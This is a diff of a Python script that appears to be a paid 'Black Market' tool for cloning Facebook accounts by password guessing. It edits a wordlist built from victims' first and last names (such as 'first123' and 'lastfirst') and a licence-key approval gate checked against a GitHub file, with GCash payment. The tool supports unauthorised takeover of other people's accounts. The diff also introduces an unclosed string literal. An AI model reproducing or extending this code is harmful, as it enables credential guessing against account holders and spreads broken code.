@@ -270,10 +270,10 @@ def YUJI():
                                 print('[1] WORKING PASSWORD FOR CLONING ')
                                 print('[2] CRACK WITH CHOICE PASSWORD ')
                                 linex()
-                                ppp=input('[+] CHOOSE AN OPTION: ')
+                                ppp=input('[+] CHOOSE: ')
                                 if ppp in ['1','01']:
-                                        plist.append('lastpogi')
-                                        plist.append('lastmaganda')
+                                        plist.append('first')
+                                        plist.append('last')
                                         plist.append('first123')
                                         plist.append('first1234')
                                         plist.append('first12345')
@@ -286,8 +286,8 @@ def YUJI():
                                         plist.append('lastfirst')
                                         plist.append('first last')
                                         plist.append('last first')
-                                        plist.append('firstpogi')
-                                        plist.append('firstmaganda')
+                                        plist.append('lastlast')
+                                        plist.append('firstfirst')
                                 else:
                                         try:
                                                 linex()
@@ -512,44 +512,40 @@ def ffb1(ids,names,passlist):
                 
 #++++++++++++++ APPROVAL+++++++++++#
 def yuji_menu():
-    print("Hello, Welcome to Yuji Greigor's Python Tool!")
-
-    DARK = requests.get("https://github.com/YUJI052000/Tool/blob/main/Approval.txt").text
-
-    id = str(os.geteuid()) + str(os.getlogin())
-    id = "5".join(id)
-
-    SN = "-SN05"
-
+    name = input("Your Name: ")
+    first_name = name.split()[0]
+    SN="-SN05
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/YUJI052000/Tool/blob/main/Approval.txt").text
     if id in DARK:
-        name = input("Your Name: ")
-        first_name = name.split()[0]
-
-        if id.startswith(first_name):
-            print("Access Granted!")
-        else:
-            print("Access Denied. Please ensure that you are the correct user.")
+        YUJI()
     else:
         os.system("clear")
         time.sleep(2.0)
-
+        
         os.system("clear")
-        print("Please get approval first.")
+        print(logo)
+        print(" \33[1;32m PLEASE GET APPROVAL FIRST\33[1;37m ")
         time.sleep(1)
         os.system('clear')
-        print("YUJI GREIGOR [Black Market]")
-        print("Note : THIS IS A PAID TOOL!")
+        print(logo)
         print("")
-        print("Mode of Payment : GCASH ")
+        print(" \33[1;32m YUJI GREIGOR [Black Market] \33[1;37m ")
+        print(" \33[1;32m Note : THIS IS A PAID TOOL!   \33[1;37m")
+        print ("")
+        print("  Mode of Payment : GCASH  ")
         print("")
-        print("Your key is not Approved. ")
+        print(" Your key is not Approved. ")
         print("")
-        print("Copy and Send Key To Yuji Greigor")
-        print("")
-        print("Your Key : " +first_name+id+SN)
-        print("\n")
-        name = input("Your Name: ")
-        print("")
-        input("Press Enter To Send Key")
+        print(" Copy and Send Key To Yuji Greigor")
+        print ("")
+        print("Your Key : " + first_name + "-" + id + SN)
+        print ("\n")
+        name = input(" Your Name : ")
+        print ("")
+        input(" Press Enter To Send Key")
         yuji_menu()   
 yuji_menu()
+    
